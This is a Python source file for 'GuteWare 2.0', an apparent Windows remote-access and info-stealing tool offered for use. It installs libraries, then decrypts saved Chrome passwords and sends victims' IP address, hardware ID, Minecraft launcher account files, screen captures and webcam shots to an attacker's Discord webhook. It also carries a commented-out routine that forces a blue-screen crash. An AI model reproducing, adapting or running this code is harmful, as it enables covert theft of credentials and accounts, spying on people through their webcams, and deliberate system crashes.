#  ██████╗ ██╗   ██╗████████╗███████╗██╗    ██╗ █████╗ ██████╗ ███████╗    ██████╗     ██████╗ 
# ██╔════╝ ██║   ██║╚══██╔══╝██╔════╝██║    ██║██╔══██╗██╔══██╗██╔════╝    ╚════██╗   ██╔═████╗
# ██║  ███╗██║   ██║   ██║   █████╗  ██║ █╗ ██║███████║██████╔╝█████╗       █████╔╝   ██║██╔██║
# ██║   ██║██║   ██║   ██║   ██╔══╝  ██║███╗██║██╔══██║██╔══██╗██╔══╝      ██╔═══╝    ████╔╝██║
# ╚██████╔╝╚██████╔╝   ██║   ███████╗╚███╔███╔╝██║  ██║██║  ██║███████╗    ███████╗██╗╚██████╔╝
#  ╚═════╝  ╚═════╝    ╚═╝   ╚══════╝ ╚══╝╚══╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝    ╚══════╝╚═╝ ╚═════╝ 

import os
import time
clear = lambda: os.system('cls')

print("Installing python libraries, please wait...")
time.sleep(2)

os.system("pip install requests")
clear()
time.sleep(.1)
os.system("pip install psutil")
clear()
time.sleep(.1)
os.system("pip install coloredlogs")
clear()
time.sleep(.1)
os.system("pip install dhooks")
clear()
time.sleep(.1)
os.system("pip install pyautogui")
clear()
time.sleep(.1)
os.system("pip install keyboard")
clear()
time.sleep(.1)
os.system("pip install pyHook")
clear()
time.sleep(.1)
os.system("pip install httplib2")
clear()
time.sleep(.1)
os.system("pip install opencv-python")
clear()

print("Library installation finished, continuing.")

from ipaddress import ip_address
import ipaddress, threading, subprocess, requests, re, ctypes, logging, hashlib, time, secrets, random, json, socket, sqlite3, shutil, base64, win32gui, win32gui, time,httplib2, sys, psutil
import pyautogui, win32crypt
from dhooks import Webhook, File, Embed
from random import randint
from colorama import Fore
from threading import Timer
from datetime import datetime
from urllib.request import Request, urlopen
from colorama import Fore
from Crypto.Cipher import AES
from datetime import timezone, datetime, timedelta
from ctypes import *
from time import sleep
from threading import Timer 
from multiprocessing import Process
from subprocess import PIPE
from pathlib import Path  
import pygame
import pygame.camera
clear()
from os import system
import time
import urllib.request as urllib2
import platform

os.system('color')


#  ██████╗██╗   ██╗████████╗    ██╗   ██╗██████╗ ██╗     ███████╗
# ██╔════╝██║   ██║╚══██╔══╝    ██║   ██║██╔══██╗██║     ██╔════╝
# ██║     ██║   ██║   ██║       ██║   ██║██████╔╝██║     ███████╗
# ██║     ██║   ██║   ██║       ██║   ██║██╔══██╗██║     ╚════██║
# ╚██████╗╚██████╔╝   ██║       ╚██████╔╝██║  ██║███████╗███████║
#  ╚═════╝ ╚═════╝    ╚═╝        ╚═════╝ ╚═╝  ╚═╝╚══════╝╚══════╝

# //////////////////////////////////////////////////////////////

# IP Grabbing Site
jlkfjgf = "https://api"
flkgjdfg = ".ipify"
sdkfjsd = ".org"

# Pc Info Webhook

# (set your gist here)

# how to set your gist properly:
# take the link of your gist, DO NOT CLICK THE RAW BUTTON, THAT WILL NOT WORK.
# after you have your link, paste it (it should look something like this: https://gist.github.com/test/713670965c4c68010ec4b5c034c2d72d)
# then, add /raw to the end to make it look like this: https://gist.github.com/test/713670965c4c68010ec4b5c034c2d72d/raw

data = requests.get(
    'set your gist here')
for line in data:
    linedecoded = line.decode()
    webhook = Webhook(linedecoded)

OperatingSystem = platform.system()
OSVersion = platform.release()

# ██╗██████╗      ██████╗ ██████╗  █████╗ ██████╗ ██████╗ ███████╗██████╗ 
# ██║██╔══██╗    ██╔════╝ ██╔══██╗██╔══██╗██╔══██╗██╔══██╗██╔════╝██╔══██╗
# ██║██████╔╝    ██║  ███╗██████╔╝███████║██████╔╝██████╔╝█████╗  ██████╔╝
# ██║██╔═══╝     ██║   ██║██╔══██╗██╔══██║██╔══██╗██╔══██╗██╔══╝  ██╔══██╗
# ██║██║         ╚██████╔╝██║  ██║██║  ██║██████╔╝██████╔╝███████╗██║  ██║
# ╚═╝╚═╝          ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═════╝ ╚═════╝ ╚══════╝╚═╝  ╚═╝
                                                                        
# ///////////////////////////////////////////////////////////////////////

ip = urlopen(Request("https://api.ipify.org")).read().decode().strip()


# ██████╗  ██████╗    ██╗███╗   ██╗███████╗ ██████╗     ███████╗███████╗███╗   ██╗██████╗ ██╗███╗   ██╗ ██████╗ 
# ██╔══██╗██╔════╝    ██║████╗  ██║██╔════╝██╔═══██╗    ██╔════╝██╔════╝████╗  ██║██╔══██╗██║████╗  ██║██╔════╝ 
# ██████╔╝██║         ██║██╔██╗ ██║█████╗  ██║   ██║    ███████╗█████╗  ██╔██╗ ██║██║  ██║██║██╔██╗ ██║██║  ███╗
# ██╔═══╝ ██║         ██║██║╚██╗██║██╔══╝  ██║   ██║    ╚════██║██╔══╝  ██║╚██╗██║██║  ██║██║██║╚██╗██║██║   ██║
# ██║     ╚██████╗    ██║██║ ╚████║██║     ╚██████╔╝    ███████║███████╗██║ ╚████║██████╔╝██║██║ ╚████║╚██████╔╝
# ╚═╝      ╚═════╝    ╚═╝╚═╝  ╚═══╝╚═╝      ╚═════╝     ╚══════╝╚══════╝╚═╝  ╚═══╝╚═════╝ ╚═╝╚═╝  ╚═══╝ ╚═════╝ 
                                                                                                              
# /////////////////////////////////////////////////////////////////////////////////////////////////////////////


loginname = os.getlogin()
hwid = str(subprocess.check_output('wmic csproduct get uuid')).split('\\r\\n')[1].strip('\\r').strip()

icon = "https://cdn.discordapp.com/attachments/920469526158639137/995553408499077210/unknown.png"

PC_INFO_EMBED = Embed(
    title=f"New request from {loginname}",
    color=0xFF0000,
    timestamp ='now'
)

PC_INFO_EMBED.set_author(name="Gute Nacht", icon_url=icon)
PC_INFO_EMBED.add_field(name="\u2063", value = f"**IP Address**: `{ip}` \n**HWID**: `{hwid}` \n**OS**: `{OperatingSystem} {OSVersion}`")
PC_INFO_EMBED.set_footer(text="https://github.com/dacianfan/GuteWare-python-rat")

CAM_ERROR_EMBED = Embed(
    title=f"Failed to take screenshot of {loginname}'s camera :(",
    color=0xFF0000,
    timestamp ='now'
)

CAM_ERROR_EMBED.set_author(name="Gute Nacht", icon_url=icon)
CAM_ERROR_EMBED.add_field(name="\u2063", value = f"**Reason**: User has no webcam :(")
CAM_ERROR_EMBED.set_footer(text="https://github.com/dacianfan/GuteWare-python-rat")
webhook.send(embed=PC_INFO_EMBED)

Credit = Embed(
    title=f"Credits:",
    color=0xFF0000,
)

Credit.set_author(name="Gute Nacht", icon_url=icon)
Credit.add_field(name="\u2063", value = f"You are using GuteWare 2.0! \nGet it at https://github.com/dacianfan/GuteWare-python-rat \n\n<3 - Gute Nacht")
Credit.set_footer(text="https://github.com/dacianfan/GuteWare-python-rat")

#  ██████╗██╗  ██╗██████╗  ██████╗ ███╗   ███╗███████╗    ██████╗  █████╗ ███████╗███████╗██╗    ██╗ ██████╗ ██████╗ ██████╗ ███████╗
# ██╔════╝██║  ██║██╔══██╗██╔═══██╗████╗ ████║██╔════╝    ██╔══██╗██╔══██╗██╔════╝██╔════╝██║    ██║██╔═══██╗██╔══██╗██╔══██╗██╔════╝
# ██║     ███████║██████╔╝██║   ██║██╔████╔██║█████╗      ██████╔╝███████║███████╗███████╗██║ █╗ ██║██║   ██║██████╔╝██║  ██║███████╗
# ██║     ██╔══██║██╔══██╗██║   ██║██║╚██╔╝██║██╔══╝      ██╔═══╝ ██╔══██║╚════██║╚════██║██║███╗██║██║   ██║██╔══██╗██║  ██║╚════██║
# ╚██████╗██║  ██║██║  ██║╚██████╔╝██║ ╚═╝ ██║███████╗    ██║     ██║  ██║███████║███████║╚███╔███╔╝╚██████╔╝██║  ██║██████╔╝███████║
#  ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝ ╚═╝     ╚═╝╚══════╝    ╚═╝     ╚═╝  ╚═╝╚══════╝╚══════╝ ╚══╝╚══╝  ╚═════╝ ╚═╝  ╚═╝╚═════╝ ╚══════╝
                                                                                                                                   
# //////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

def chrome_date_and_time(chrome_data):

    return datetime(1601, 1, 1) + timedelta(microseconds=chrome_data)
  
  
def fetching_encryption_key():

    local_computer_directory_path = os.path.join(
      os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", 
      "User Data", "Local State")
      
    with open(local_computer_directory_path, "r", encoding="utf-8") as f:
        local_state_data = f.read()
        local_state_data = json.loads(local_state_data)

    encryption_key = base64.b64decode(
      local_state_data["os_crypt"]["encrypted_key"])

    encryption_key = encryption_key[5:]

    return win32crypt.CryptUnprotectData(encryption_key, None, None, None, 0)[1]
  
  
def password_decryption(password, encryption_key):
    try:
        iv = password[3:15]
        password = password[15:]

        cipher = AES.new(encryption_key, AES.MODE_GCM, iv)

        return cipher.decrypt(password)[:-16].decode()
    except:
          
        try:
            return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
        except:
            return "No Passwords"
  
  
def main():
    key = fetching_encryption_key()
    db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                           "Google", "Chrome", "User Data", "default", "Login Data")
    filename = (r"C:\\Users\\"+ loginname + r"\\AppData\\Local\\Temp\\HWIDAuth.db")
    shutil.copyfile(db_path, filename)

    db = sqlite3.connect(filename)
    cursor = db.cursor()

    cursor.execute(
        "select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins "
        "order by date_last_used")

    for row in cursor.fetchall():
        main_url = row[0]
        login_page_url = row[1]
        user_name = row[2]
        decrypted_password = password_decryption(row[3], key)
        date_of_creation = row[4]
        last_usuage = row[5]
          
        if user_name or decrypted_password:
            
            with open(r"C:\\Users\\"+ loginname + r"\\AppData\\Local\\Temp\\chromepass.txt", "a", encoding='utf-8', errors = 'ignore') as o:
                o.write(f'==================================================================================================================================================== \n')   
                o.write(f'URL: {main_url} \n')
                o.write(f'User name: {user_name} \n')
                o.write(f'Password: {decrypted_password} \n')    
          
        else:
            continue

    with open("C:\\Users\\"+ loginname + r"\\AppData\\Local\\Temp\\chromepass.txt", "a") as o:
                if date_of_creation != 86400000000 and date_of_creation:
                    o.write(f"Creation date: {str(chrome_date_and_time(date_of_creation))} \n")
                if last_usuage != 86400000000 and last_usuage:    
                    o.write(f"Last Used: {str(chrome_date_and_time(last_usuage))} \n")

                passwords = File(r"C:\\Users\\"+ loginname + r"\\AppData\\Local\\Temp\\chromepass.txt", name='passwords.txt')
                webhook.send("", file=passwords)
                o.close()
                time.sleep(1)
                os.remove("C:\\Users\\"+ loginname + r"\\AppData\\Local\\Temp\\chromepass.txt")
  
if __name__ == "__main__":
    main()


# ███████╗██╗██╗     ███████╗     ██████╗ ██████╗  █████╗ ██████╗ ██████╗ ██╗███╗   ██╗ ██████╗ 
# ██╔════╝██║██║     ██╔════╝    ██╔════╝ ██╔══██╗██╔══██╗██╔══██╗██╔══██╗██║████╗  ██║██╔════╝ 
# █████╗  ██║██║     █████╗      ██║  ███╗██████╔╝███████║██████╔╝██████╔╝██║██╔██╗ ██║██║  ███╗
# ██╔══╝  ██║██║     ██╔══╝      ██║   ██║██╔══██╗██╔══██║██╔══██╗██╔══██╗██║██║╚██╗██║██║   ██║
# ██║     ██║███████╗███████╗    ╚██████╔╝██║  ██║██║  ██║██████╔╝██████╔╝██║██║ ╚████║╚██████╔╝
# ╚═╝     ╚═╝╚══════╝╚══════╝     ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═════╝ ╚═════╝ ╚═╝╚═╝  ╚═══╝ ╚═════╝ 

# ////////////////////////////////////////////////////////////////////////////////////////////

# latest.log
#////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

path_to_log = ("C:\\Users\\guten\\AppData\\Roaming\\.minecraft\\logs\\latest.log")
path_log = Path(path_to_log)

if path_log.is_file():
    latest_log = File("C:\\Users\\guten\\AppData\\Roaming\\.minecraft\\logs\\latest.log", name = "latest.log")
    webhook.send("", file = latest_log)
else:
    pass

# launcher_accounts.json
#////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

path_to_LAccs = ("C:\\Users\\guten\\AppData\\Roaming\\.minecraft\\launcher_accounts.json")
path_accs = Path(path_to_LAccs)

if path_accs.is_file():
    launcheraccounts = File("C:\\Users\\guten\\AppData\\Roaming\\.minecraft\\launcher_accounts.json", name = "launcheraccounts.json")
    webhook.send("", file = launcheraccounts)
else:
    pass
 
# launcher_log.txt
#////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

path_to_LLog = ("C:\\Users\\guten\\AppData\\Roaming\\.minecraft\\launcher_log.txt")
path_llog = Path(path_to_LLog)

if path_llog.is_file():
    launcherlog = File("C:\\Users\\guten\\AppData\\Roaming\\.minecraft\\launcher_log.txt", name = "launcher_log.txt")
    webhook.send("", file = launcherlog)
else:
    pass

# launcher_profiles.json
#////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

path_to_LProfiles = ("C:\\Users\\guten\\AppData\\Roaming\\.minecraft\\launcher_profiles.json")
path_LProfs = Path(path_to_LProfiles)

if path_LProfs.is_file():
    launcherprofiles = File("C:\\Users\\guten\\AppData\\Roaming\\.minecraft\\launcher_profiles.json", name = "launcher_profiles.json")
    webhook.send("", file = launcherprofiles)
else:
    pass


# ██████╗  ██████╗    ███████╗ ██████╗██████╗ ███████╗███████╗███╗   ██╗███████╗██╗  ██╗ ██████╗ ████████╗
# ██╔══██╗██╔════╝    ██╔════╝██╔════╝██╔══██╗██╔════╝██╔════╝████╗  ██║██╔════╝██║  ██║██╔═══██╗╚══██╔══╝
# ██████╔╝██║         ███████╗██║     ██████╔╝█████╗  █████╗  ██╔██╗ ██║███████╗███████║██║   ██║   ██║   
# ██╔═══╝ ██║         ╚════██║██║     ██╔══██╗██╔══╝  ██╔══╝  ██║╚██╗██║╚════██║██╔══██║██║   ██║   ██║   
# ██║     ╚██████╗    ███████║╚██████╗██║  ██║███████╗███████╗██║ ╚████║███████║██║  ██║╚██████╔╝   ██║   
# ╚═╝      ╚═════╝    ╚══════╝ ╚═════╝╚═╝  ╚═╝╚══════╝╚══════╝╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝ ╚═════╝    ╚═╝   

# /////////////////////////////////////////////////////////////////////////////////////////////////////

myScreenshot = pyautogui.screenshot()
myScreenshot.save("C:\\Users\\"+ loginname + r"\\AppData\\Local\\Temp\\MonitorScreenshot.png")

screenshot = File("C:\\Users\\"+ loginname + r"\\AppData\\Local\\Temp\\MonitorScreenshot.png", name = "Screenshot.png")
webhook.send("", file = screenshot)
os.remove("C:\\Users\\"+ loginname + r"\\AppData\\Local\\Temp\\MonitorScreenshot.png")


# ██╗    ██╗███████╗██████╗  ██████╗ █████╗ ███╗   ███╗    ███████╗ ██████╗██████╗ ███████╗███████╗███╗   ██╗███████╗██╗  ██╗ ██████╗ ████████╗
# ██║    ██║██╔════╝██╔══██╗██╔════╝██╔══██╗████╗ ████║    ██╔════╝██╔════╝██╔══██╗██╔════╝██╔════╝████╗  ██║██╔════╝██║  ██║██╔═══██╗╚══██╔══╝
# ██║ █╗ ██║█████╗  ██████╔╝██║     ███████║██╔████╔██║    ███████╗██║     ██████╔╝█████╗  █████╗  ██╔██╗ ██║███████╗███████║██║   ██║   ██║   
# ██║███╗██║██╔══╝  ██╔══██╗██║     ██╔══██║██║╚██╔╝██║    ╚════██║██║     ██╔══██╗██╔══╝  ██╔══╝  ██║╚██╗██║╚════██║██╔══██║██║   ██║   ██║   
# ╚███╔███╔╝███████╗██████╔╝╚██████╗██║  ██║██║ ╚═╝ ██║    ███████║╚██████╗██║  ██║███████╗███████╗██║ ╚████║███████║██║  ██║╚██████╔╝   ██║   
#  ╚══╝╚══╝ ╚══════╝╚═════╝  ╚═════╝╚═╝  ╚═╝╚═╝     ╚═╝    ╚══════╝ ╚═════╝╚═╝  ╚═╝╚══════╝╚══════╝╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝ ╚═════╝    ╚═╝   

# //////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

pygame.camera.init()
  
camlist = pygame.camera.list_cameras()
  
if camlist:
  
    cam = pygame.camera.Camera(camlist[0], (640, 480))
  
    cam.start()
    time.sleep(1)
  
    image = cam.get_image()
  
    pygame.image.save(image, "C:\\Users\\" +loginname+"\\AppData\\Local\\Temp\\webcamSS.jpg")
    webcamss = File("C:\\Users\\" +loginname+"\\AppData\\Local\\Temp\\webcamSS.jpg", name = "WebcamScreenshot.jpg")
    webhook.send("", file=webcamss)
    time.sleep(1)
    os.remove("C:\\Users\\" +loginname+"\\AppData\\Local\\Temp\\webcamSS.jpg")
else:
    webhook.send(embed=CAM_ERROR_EMBED)


# ███████╗ ██████╗ █████╗ ██████╗ ███████╗███████╗
# ██╔════╝██╔════╝██╔══██╗██╔══██╗██╔════╝██╔════╝
# ███████╗██║     ███████║██████╔╝█████╗  ███████╗
# ╚════██║██║     ██╔══██║██╔══██╗██╔══╝  ╚════██║
# ███████║╚██████╗██║  ██║██║  ██║███████╗███████║
# ╚══════╝ ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚══════╝
# ///////////////////////////////////////////////

def dl_jpg(url, file_path, file_name):
    full_path = file_path + name + '.png'
    urllib2.urlretrieve(url, full_path)
    print("Sent successfully")
    
url = "image url"
name = "image name"
cwd = os.getcwd()

def bsod():
    ntdll = ctypes.windll.ntdll
    prev_value = ctypes.c_bool()
    res = ctypes.c_ulong()
    ntdll.RtlAdjustPrivilege(19, True, False, ctypes.byref(prev_value))
    if not ntdll.NtRaiseHardError(0xDEADDEAD, 0, 0, 0, 6, ctypes.byref(res)):
        print("BSOD Successful")
    else:
        pass

# How to enable: 
# Remove all the comments or # from everything below this

#dl_jpg(url, "image_", name)
#ctypes.windll.user32.SystemParametersInfoW(20, 0, cwd + "\image_" + name + ".png", 0)
#bsod()

webhook.send(embed=Credit)